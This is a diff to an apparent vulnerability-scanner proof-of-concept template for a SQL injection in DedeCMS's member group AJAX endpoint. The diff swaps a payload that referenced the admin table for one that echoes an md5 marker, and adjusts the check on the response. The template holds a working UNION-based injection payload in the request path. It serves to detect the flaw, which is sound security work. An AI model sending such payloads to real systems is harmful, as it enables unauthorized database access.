@@ -1,7 +1,6 @@
 name: poc-yaml-dedecms-membergroup-sqli
 set:
   r: randomInt(800000000, 1000000000)
-  ident: "md5{{r}}"
 rules:
   - method: GET
     path: /member/ajax_membergroup.php?action=post&membergroup=1
@@ -11,11 +10,10 @@ rules:
   - method: GET
     path: >-
       /member/ajax_membergroup.php?action=post&membergroup=@`'`
-      /*!50000Union+*/+/*!50000select+*/{{ident}} -- from `%23@__admin` where 1 or
-      id=@`'`
+      /*!50000Union+*/+/*!50000select+*/ md5({{r}}) -- @`'`
     follow_redirects: true
     expression: |
-      response.status == 200 && response.body.contains(md5(string(r))
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
 
 detail:
   author: harris2015(https://github.com/harris2015)
